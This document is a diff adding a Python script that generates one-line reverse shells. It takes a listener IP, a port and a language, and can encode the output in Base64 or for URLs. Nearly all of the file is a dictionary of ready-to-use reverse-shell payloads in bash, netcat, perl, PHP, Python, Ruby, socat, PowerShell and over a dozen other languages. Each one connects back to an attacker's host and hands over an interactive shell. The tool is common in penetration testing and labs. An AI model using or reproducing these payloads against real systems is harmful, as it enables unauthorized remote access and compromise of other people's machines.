@@ -1,0 +1,108 @@
+#!/usr/bin/env python3
+
+import urllib.parse
+import argparse
+import base64
+
+# Python dictionary containing 'format' keys and reverse-shells as values
+revshell_dict = {"bash": {"Bash -i": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+                          "Bash -i (with 'bash -c')": "bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
+                          "Bash 196": "0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; bash <&196 >&196 2>&196",
+                          "Bash read line": "exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done",
+                          "Bash 5": "bash -i 5<> /dev/tcp/{lhost}/{lport} 0<&5 1>&5 2>&5",
+                          "Bash 5 (with 'bash -c')": "bash -c 'bash -i 5<> /dev/tcp/{lhost}/{lport} 0<&5 1>&5 2>&5'",
+                          "Bash UDP": "bash -i >& /dev/udp/{lhost}/{lport} 0>&1",
+                          "Bash UDP (with 'bash -c')": "bash -c 'bash -i >& /dev/udp/{lhost}/{lport} 0>&1'"},
+                 
+                 "nc": {"nc mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f",
+                        "nc -e": "nc {lhost} {lport} -e bash",
+                        "BusyBox nc -e": "busybox nc {lhost} {lport} -e bash",
+                        "nc -c": "nc -c bash {lhost} {lport}"},
+                 
+                 "ncat": {"ncat -e": "ncat {lhost} {lport} -e bash",
+                          "ncat UDP": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|ncat -u {lhost} {lport} >/tmp/f"},
+                 
+                 "curl": {"Curl": "C='curl -Ns telnet://{lhost}:{lport}'; $C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null"},
+                 
+                 "rustcat": {"Rustcat": "rcat connect -s bash {lhost} {lport}"},
+                 
+                 "perl": {"Perl": """perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");}};'""",
+                          "Perl (no sh)": """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""},
+                 
+                 "php": {"PHP exec": """php -r '$sock=fsockopen("{lhost}",{lport});exec("bash <&3 >&3 2>&3");'""",
+                         "PHP shell_exec": """php -r '$sock=fsockopen("{lhost}",{lport});shell_exec("bash <&3 >&3 2>&3");'""",
+                         "PHP system": """php -r '$sock=fsockopen("{lhost}",{lport});system("bash <&3 >&3 2>&3");'""",
+                         "PHP passthru": """php -r '$sock=fsockopen("{lhost}",{lport});passthru("bash <&3 >&3 2>&3");'""",
+                         "PHP `": """php -r '$sock=fsockopen("{lhost}",{lport});`bash <&3 >&3 2>&3`;'""",
+                         "PHP popen": """php -r '$sock=fsockopen("{lhost}",{lport});popen("bash <&3 >&3 2>&3", "r");'""",
+                         "PHP proc_open": """php -r '$sock=fsockopen("{lhost}",{lport});$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""},
+                 
+                 "python": {"Python #1": """export RHOST="{lhost}";export RPORT={lport};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'""",
+                            "Python #2": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""",
+                            "Python #3": """export RHOST="{lhost}";export RPORT={lport};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'""",
+                            "Python #4": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""",
+                            "Python (Shortest)": """python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'"""},
+                 
+                 "ruby": {"Ruby #1": """ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{lhost}",{lport}))'""",
+                          "Ruby (no sh)": """ruby -rsocket -e'exit if fork;c=TCPSocket.new("{lhost}","{lport}");loop{{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts "failed: #{{$_}}"}}'"""},
+                 
+                 "socat": {"Socat #1": "socat TCP:{lhost}:{lport} EXEC:bash",
+                           "Socat (TTY)": "socat TCP:{lhost}:{lport} EXEC:'bash',pty,stderr,setsid,sigint,sane"},
+                 
+                 "sqlite3": {"Sqlite3 nc mkfifo": "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f'"},
+                 
+                 "node.js": {"Node.js #1": "require('child_process').exec('nc -e bash {lhost} {lport}')"},
+
+                 "groovy": {"Groovy": '''String host="{lhost}";int port={lport};String cmd="bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();'''},
+                 
+                 "telnet": {"Telnet": "TF=$(mktemp -u);mkfifo $TF && telnet {lhost} {lport} 0<$TF | bash 1>$TF"},
+                 
+                 "zsh": {"ZSH": "zsh -c 'zmodload zsh/net/tcp && ztcp {lhost} {lport} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"},
+                 
+                 "lua": {"Lua #1": '''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('bash -i <&3 >&3 2>&3');"''',
+                         "Lua #2": """lua5.1 -e 'local host, port = "{lhost}", {lport} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'"""},
+                 
+                 "golang": {"Golang": '''echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'''},
+                         
+                 "vlang": {"Vlang": '''echo 'import os' > /tmp/t.v && echo 'fn main() {{ os.system("nc -e bash {lhost} {lport} 0>&1") }}' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v'''},
+                         
+                 "awk": {"Awk": '''awk 'BEGIN {{s = "/inet/tcp/0/{lhost}/{lport}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null'''},
+
+                 "crystal": {"Crystal (System)": """crystal eval 'require "process";require "socket";c=Socket.tcp(Socket::Family::INET);c.connect("{lhost}",{lport});loop{{m,l=c.receive;p=Process.new(m.rstrip("\n"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}}'"""},
+
+                 "powershell": {"Powershell #1": '''$LHOST = "{lhost}"; $LPORT = {lport}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; if ($TCPClient.Connected -and $Code.Length -gt 1) {{ $Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; $StreamWriter.Write("$Output`n"); $Code = $null }} }}; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()''',
+                                "Powershell #2": '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
+                                "Powershell #3": '''powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{lhost}', {lport});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()"''',
+                                "Powershell (TLS)": '''$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{lhost}', {lport});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{$SslStream.Close();exit}}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()'''}
+                 }
+
+# Initialise argparse
+parser = argparse.ArgumentParser(description="Generate one-line reverse shells.")
+# Set argparse arguments
+parser.add_argument("-l", "--lhost", help="Listener IP Address.", type=str, required=True)
+parser.add_argument("-p", "--lport", help="Listener Port.", type=str, required=True)
+parser.add_argument("-f", "--format", help="Reverse Shell Language.", type=str, required=True, choices=["bash", "nc", "ncat", "curl", "rustcat", "perl", "php", "python", "ruby", "socat", "sqlite3", "node.js", "groovy", "telnet", "zsh", "lua", "golang", "vlang", "awk", "crystal", "powershell"])
+parser.add_argument("-e", "--encoding", help="Encode The Reverse Shell. Base64 (B) or URI Encode (U).", type=str, required=False, choices=['B', 'U'], default=None)
+args = parser.parse_args()
+
+# Fetch the reverse-shell values for the given 'format' key
+one_liners = revshell_dict[args.format]
+
+# For each reverse-shell type;
+for title in one_liners.keys():
+    # Check if URI encoding is specified
+    if args.encoding == "U":
+        # Specify safe characters that should not be URI encoded
+        safe_characters = "-_.~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        # Print each reverse-shell as URL-encoded
+        print(f"\n{title}\n{'-'*25}\n{urllib.parse.quote(one_liners[title].format(lhost=args.lhost, lport=args.lport), safe=safe_characters)}")
+
+    # Check if Base64 encoding is specified
+    elif args.encoding == "B":
+        # Print each reverse-shell as Base64 encoded
+        print(f"\n{title}\n{'-'*25}\n{base64.b64encode(one_liners[title].format(lhost=args.lhost, lport=args.lport).encode()).decode()}")
+
+    # If no encoding is specified;
+    else:
+        # Print each reverse-shell as plaintext
+        print(f"\n{title}\n{'-'*25}\n{one_liners[title].format(lhost=args.lhost, lport=args.lport)}")
